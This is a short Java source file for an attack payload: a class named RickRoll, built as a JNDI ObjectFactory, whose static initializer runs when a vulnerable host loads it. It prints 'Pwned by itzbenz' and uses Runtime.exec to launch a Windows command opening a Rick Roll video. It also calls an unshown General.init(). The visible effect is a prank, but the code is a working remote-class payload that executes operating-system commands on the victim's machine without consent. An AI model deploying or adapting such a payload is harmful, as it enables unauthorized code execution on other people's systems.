package itzbenz.payload;

import javax.naming.Context;
import javax.naming.Name;
import java.io.IOException;
import java.io.Serializable;
import java.util.Hashtable;

public class RickRoll implements javax.naming.spi.ObjectFactory, Serializable {
    static {

        if (System.getProperty("pwned") == null) {
            init();
        }
        General.init();
    }

    public static void init() {
        //cringe message
        System.err.println("Pwned by itzbenz");

        try {
            Runtime.getRuntime().exec("cmd /c start http://www.youtube.com/watch?v=dQw4w9WgXcQ");
        } catch (IOException e) {

        }
        //cringe message
        System.out.println("Pwned by itzbenz");
    }

    @Override
    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment) throws
            Exception {
        return new RickRoll();
    }
}
